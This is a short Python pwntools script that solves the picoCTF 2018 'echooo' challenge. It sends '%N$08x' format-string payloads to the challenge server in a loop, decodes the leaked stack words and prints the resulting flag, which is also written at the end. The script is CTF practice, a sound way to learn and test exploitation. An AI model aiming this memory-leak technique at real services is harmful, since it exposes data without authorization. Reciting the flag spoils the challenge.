from pwn import *
import sys

print('''
                 [ Solved by Souleymane Guerida AKA ( Th3_w1ck3d ) ]
                    picoCTF ==> Name : [ echooo ] 
''')



r = remote('2018shell2.picoctf.com', 46960)


## i calulated {addresses_n } it manually starting from 11 by running the script over and over again 
## until i reached the point where i started recieving the flag, {27} 
addresses_n = 27
flag = ''
string = '}'

while True:
	r.recvuntil('> ')
	r.sendline("%" + str(addresses_n) + "$08x")

	## p32(int(0x41414141)) == 'AAAA', decoding the addresses
	respond = p32(int(r.recvline().strip(), 16))

	flag += respond
	print "Recieved : " + flag


	if "}" in flag:
		sys.exit(1)
		
	## keep adding 1 to until we recieve the whole flag
	addresses_n += 1 






##########################################################
###### picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d} ####
##########################################################
